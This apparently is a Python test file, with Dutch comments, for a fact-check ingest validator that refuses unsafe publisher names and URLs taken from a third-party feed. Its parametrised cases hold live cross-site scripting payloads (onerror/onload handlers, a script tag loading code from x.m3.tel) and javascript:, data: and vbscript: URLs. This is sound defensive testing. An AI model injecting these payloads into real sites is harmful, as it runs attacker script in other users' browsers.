"""Wat er uit de feed binnenkomt is invoer van derden (PLAN.md #17.5).

Iedereen mag ClaimReview publiceren en niemand controleert het — dat stond al
in §43c toen bleek dat een drukkerij zich als factchecker voordeed. Het corpus
bevat ook zeven uitgeversnamen die scriptpayloads zijn, één met een verwijzing
naar `xss.report`. Ze zijn met een scanner in andermans markup gezet en via de
feed bij ons beland.

Onze eigen webinterface ontsnapt ze, maar dat is niet waar het om gaat: we
publiceren een protocol dat derden vertelt deze velden te consumeren
(PROTOCOL §5). Wat de resolver doorgeeft is inhoud van derden, en de plek om
dat te stoppen is de import — niet elke aanroepsite van elke afnemer.
"""

import pytest

from doublecheck.factchecktools import RawFactcheck
from doublecheck.ingest import _weigergrond


def _check(**overschrijf):
    velden = dict(
        publisher="Nieuwscheckers",
        publisher_site="nieuwscheckers.nl",
        url="https://nieuwscheckers.nl/check/1",
        review_date="2024-03-14",
        verdict_original="Onjuist",
        language="nl",
    )
    velden.update(overschrijf)
    return RawFactcheck(**velden)


def test_an_ordinary_factcheck_is_still_accepted():
    assert _weigergrond(_check()) is None


@pytest.mark.parametrize(
    "naam",
    [
        '"><svg/onload=alert(1)>',
        ">'>\"><img src=x onerror=alert(0)>",
        '"\'><script src=https://x.m3.tel></script>',
        "${7*7}{{7*7}}\"--></script><img/src=x onerror=';alert(0);'>",
        "http://69bot69.blogspot.com/?{{[[a]]}}<img src=x onerror=print(1)>",
    ],
)
def test_a_publisher_name_carrying_markup_is_refused(naam):
    """Deze vijf staan letterlijk in het corpus (§47)."""
    assert _weigergrond(_check(publisher=naam)) == "onveilige_uitgeversnaam"


@pytest.mark.parametrize(
    "url",
    [
        "javascript:alert(1)",
        "JavaScript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
        "  javascript:alert(1)",
    ],
)
def test_a_url_that_is_not_a_web_address_is_refused(url):
    """HTML-ontsnappen redt een `href` niet: `javascript:` blijft draaien.

    Het corpus bevat er vandaag geen — 80.863 https en 166 http — maar er stond
    ook niets dat het tegenhield.
    """
    assert _weigergrond(_check(url=url)) == "onveilige_url"


@pytest.mark.parametrize("url", ["https://example.org/a", "http://example.org/a"])
def test_plain_web_addresses_stay_welcome(url):
    assert _weigergrond(_check(url=url)) is None
